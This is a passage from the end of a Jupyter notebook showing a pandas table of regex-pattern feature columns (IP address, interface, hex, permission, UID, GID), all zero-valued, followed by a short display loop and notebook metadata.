       "14                                       0   \n",
       "\n",
       "    \\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}  eth[0-9]$  0x[0-9a-zA-Z]{8}  \\\n",
       "0                                    0          0                 0   \n",
       "1                                    0          0                 0   \n",
       "2                                    0          0                 0   \n",
       "3                                    0          0                 0   \n",
       "4                                    0          0                 0   \n",
       "5                                    0          0                 0   \n",
       "6                                    0          0                 0   \n",
       "7                                    0          0                 0   \n",
       "8                                    0          0                 0   \n",
       "9                                    0          0                 0   \n",
       "10                                   0          0                 0   \n",
       "11                                   0          0                 0   \n",
       "12                                   0          0                 0   \n",
       "13                                   0          0                 0   \n",
       "14                                   0          0                 0   \n",
       "\n",
       "    permission:{0,1}[0-9]{0,4}  UID  GID  match  \n",
       "0                            0    0    0      0  \n",
       "1                            0    0    0      0  \n",
       "2                            0    0    0      0  \n",
       "3                            0    0    0      0  \n",
       "4                            0    0    0      0  \n",
       "5                            0    0    0      0  \n",
       "6                            0    0    0      0  \n",
       "7                            0    0    0      0  \n",
       "8                            0    0    0      0  \n",
       "9                            0    0    0      0  \n",
       "10                           0    0    0      0  \n",
       "11                           0    0    0      0  \n",
       "12                           0    0    0      0  \n",
       "13                           0    0    0      0  \n",
       "14                           0    0    0      0  \n",
       "\n",
       "[15 rows x 24 columns]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "for rem in fset.rem_lst:\n",
    "    display(rem.get_match_sentences())\n",
    "    break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.5 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.5"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "125a1d8b627fe68767755740015967bae857d08bb92fb3fd0d9d8ed24f978d39"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
